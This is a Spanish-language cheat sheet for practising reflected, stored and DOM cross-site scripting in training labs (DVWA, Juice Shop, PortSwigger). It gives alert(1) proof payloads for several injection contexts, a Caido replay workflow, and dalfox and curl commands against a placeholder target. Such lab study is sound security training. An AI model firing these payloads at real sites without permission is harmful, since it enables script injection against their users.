<div align="center">

# 🧨 XSS
### Reflected, Stored y DOM XSS

</div>

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | XSS Reflected, XSS Stored, XSS DOM |
| **Juice Shop** | DOM XSS, Bonus Payload, Reflected XSS, API-only XSS |
| **PortSwigger** | Cross-site scripting |

---

## 🛠️ Herramientas

- **Caido**: `Replay`, `HTTP History`
- Firefox DevTools
- `dalfox`

---

## 🔍 Buscar

- input reflejado en HTML
- input dentro de atributo
- input dentro de string JS
- sinks DOM:
  - `innerHTML`
  - `document.write`
  - `location.search`
  - `location.hash`
  - `eval`

---

## 🧪 Payloads Base

### HTML context

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### Attribute context

```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
"><svg/onload=alert(1)>
```

### JavaScript string context

```javascript
'-alert(1)-'
';alert(1);//
</script><svg/onload=alert(1)>
```

### DOM probes

```text
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
```

---

## 🔁 Flujo con Caido

### `[01]` Hallar reflection

Capturar request de:

- búsqueda
- comentarios
- feedback
- profile fields
- parámetros `q`, `search`, `name`, `returnUrl`

### `[02]` Replay manual

Primero payload mínimo:

```text
test123
<xss123>
"><xss123>
```

Luego payload ejecutable:

```text
<svg/onload=alert(1)>
```

### `[03]` Observar contexto

Mirar response:

- raw HTML
- ubicación exacta
- encode parcial/completo
- CSP

### `[04]` Variantes

Si bloquea `<script>`, probar:

```text
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

---

## ⚙️ Comandos Útiles

```bash
dalfox url "http://target/search?q=FUZZ"

curl -i "http://target/search?q=%3Csvg/onload=alert(1)%3E"
```

---

## 🧠 Contextos Típicos

| Contexto | Ejemplo |
|----------|---------|
| **HTML body** | `<div>INPUT</div>` |
| **Attribute** | `<input value="INPUT">` |
| **JS string** | `var x='INPUT'` |
| **URL / href** | `<a href="INPUT">` |
| **DOM sink** | JS toma `location.search` y lo renderiza |

---

## 🧭 Ruta de Práctica

1. DVWA Reflected XSS
2. DVWA Stored XSS
3. DVWA DOM XSS
4. Juice Shop DOM XSS
5. Juice Shop Reflected XSS
6. PortSwigger: reflected HTML
7. PortSwigger: attribute injection
8. PortSwigger: JS string escape
9. PortSwigger: DOM XSS con `document.write` / `innerHTML`

---

## 📝 Checklist

- source controlado localizado
- sink identificado
- contexto exacto definido
- payload mínimo reflejado
- payload ejecutable validado
- CSP / filtros documentados
